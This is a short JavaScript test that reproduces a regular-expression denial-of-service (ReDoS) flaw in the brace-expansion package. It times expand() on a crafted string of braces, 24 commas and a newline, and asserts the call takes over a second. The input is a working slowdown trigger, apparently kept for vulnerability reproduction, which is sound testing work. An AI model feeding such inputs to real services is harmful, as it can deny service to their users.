test("ReDoS in brace-expansion", () => {
  const expand = require("brace-expansion");
  const measureTime = require("../utils").measureTime;
  let t = measureTime(function () {
    expand("{" + ",".repeat(24) + "\n}");
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
